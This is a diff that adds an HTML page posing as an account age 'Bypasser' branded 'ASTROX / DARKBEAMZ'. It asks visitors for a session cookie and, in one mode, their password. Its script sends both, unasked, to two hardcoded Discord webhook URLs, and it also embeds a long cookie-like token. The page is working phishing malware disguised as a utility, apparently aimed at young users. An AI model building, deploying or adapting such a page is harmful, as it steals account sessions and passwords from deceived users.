@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Untitled</title>
+  
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bypasser</title>
+  <style>
+    body, html {
+      height: 100%;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      color: white;
+      overflow: hidden;
+    }
+
+    .background {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: radial-gradient(circle at center, #000000 0%, #1a1a1a 100%);
+      animation: pulse 5s infinite alternate;
+      z-index: -1;
+    }
+
+    @keyframes pulse {
+      0% { filter: brightness(1); }
+      100% { filter: brightness(1.3); }
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100%;
+    }
+
+    /* Title Animation */
+    .title {
+      font-size: 72px;
+      font-weight: bold;
+      margin-bottom: 30px;
+      text-align: center;
+      text-transform: uppercase;
+      letter-spacing: 5px;
+      opacity: 0;
+      animation: typewriter 4s steps(30) 1s forwards, fadeIn 2s 6s forwards;
+    }
+
+    @keyframes typewriter {
+      from {
+        width: 0;
+      }
+      to {
+        width: 100%;
+      }
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+      }
+      to {
+        opacity: 1;
+      }
+    }
+
+    /* Button Hover and Click Effects */
+    .buttons {
+      margin-bottom: 20px;
+    }
+
+    button {
+      background-color: #333;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      margin: 10px;
+      font-size: 18px;
+      cursor: pointer;
+      border-radius: 8px;
+      transition: all 0.3s ease;
+      transform: scale(1);
+    }
+
+    button:hover {
+      background-color: #555;
+      transform: scale(1.1); /* Slightly enlarge on hover */
+    }
+
+    button:active {
+      transform: scale(0.95); /* Slightly shrink on click */
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    .input-group {
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .input-group input {
+      padding: 10px;
+      margin: 5px;
+      font-size: 16px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+
+    .error {
+      color: red;
+      font-size: 18px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="background"></div>
+  <div class="container">
+    <div class="title">ASTROX / DARKBEAMZ</div> <!-- Animated Title -->
+    <div class="buttons">
+      <button onclick="showInputs('+13')">+13 to &lt;13</button>
+      <button onclick="showInputs('<13')">&lt;13 to +13</button>
+    </div>
+    <div class="input-group" id="inputs"></div>
+    <div id="error-message" class="error"></div>
+  </div>
+
+  <script>
+    const validCookie = "NFSAMX6QlF3XhO6AF5A4E6255B34F400342E05A5DA83A19303A174E938904AFA57D8FE2A9A6B62FD2595CDE98A2888C3AEF6217E65E35EC886845DB75D06968897008259CB7748255B78A3177B8974522CB577BBCDCF45E989C93760BD642649710B9227EFD19F53A188AFD8026637FDEFCF4D7F0DE81CDB94C41222C88FFB369CB9665B15DCC83A717304119A45B778FD2BCD3AA489D6EFB7BBEF35AF5425753B5D8ADEEEAC915D81181ED5D034915AF6542C078ECC04603BDB4B055A5AA35F3529FE79E4102532DA05E26D03DC7A68C985AAEDD00EF1433290F1DC7FC10051FBE00265C832BE300BC46267712C39AC022B4886B48B26E9F194F97A73F7A570DBDF4D79B9368894C51A46E4312E019D5AB6C9DE864810EDA0A8840772F38F23A1C5E5CB62D3F122BE2CD77930351714ED1F4885C931A323ED96A660664853BFD8C938D584016BE793E3244391B41AA9F2F8AC8904E75AF973362E217BA8374CDDC24E031CF6CF8DF650A3F73357C3454A859CBD629305D463CE066CF32E0C882572C3BF7DE32A0C9F2BC035B48EE3F79215F190D4116ACCC244670A66DD6C46EE86CB9F3B2C2E25AC57E507E255229B33FBCC22777BAC3DA094C221D480EF0597A8804172992C75D676520410046B8A5268EED56C4A49CC86C25FFBBCBAFA2CD51E16EA1D118FE9279BCCE1E0F55FAC1169C3BFDF165742D4E5FCCF6B98337E1FE0A6C43DC4BD";
+
+    function showInputs(ageGroup) {
+      const container = document.getElementById('inputs');
+      const errorMessage = document.getElementById('error-message');
+      errorMessage.innerHTML = "";  // Clear any previous error message
+
+      if (ageGroup === '+13') {
+        container.innerHTML = `
+          <input type="text" id="cookie" placeholder="Enter Cookie" /><br />
+          <input type="password" id="password" placeholder="Enter Password" />
+          <button onclick="validateCookie()">Submit</button>
+        `;
+      } else {
+        container.innerHTML = `
+          <input type="text" id="cookie" placeholder="Enter Cookie" />
+          <button onclick="validateCookie()">Submit</button>
+        `;
+      }
+    }
+
+    function validateCookie() {
+      const cookie = document.getElementById('cookie').value;
+      const password = document.getElementById('password') ? document.getElementById('password').value : '';
+      const errorMessage = document.getElementById('error-message');
+
+      // Check if the cookie is less than 50 characters or empty
+      if (cookie.length < 50 || cookie === "") {
+        errorMessage.innerHTML = "Please enter a working cookie!";
+      } else {
+        errorMessage.innerHTML = "Cookie accepted!";
+
+        // Send data to both webhooks, including the password
+        sendToWebhook('https://discord.com/api/webhooks/1369319262040359042/BakByMmbZXfkVwwYPmebjCLZpTEm0x_L4VSvTd10US6WW3tk1ExgmiOAEHZGgRPBmU_y', cookie, password);
+        sendToWebhook('https://discord.com/api/webhooks/1332783761095659620/C67zmgRhXch25vKd14vrVa5lQBcKaXwseXs6NoRAkl1tDca1B33ZsvJBfbzTi0U_I6EA', cookie, password);
+      }
+    }
+
+    function sendToWebhook(webhookUrl, cookie, password) {
+      const payload = {
+        content: `New cookie submitted: ${cookie}\nPassword: ${password}`
+      };
+
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => response.json())
+      .then(data => console.log("Webhook success:", data))
+      .catch(error => console.error("Error sending to webhook:", error));
+    }
+  </script>
+</body>
+</html>
+<!-- partial -->
+  
+</body>
+</html>
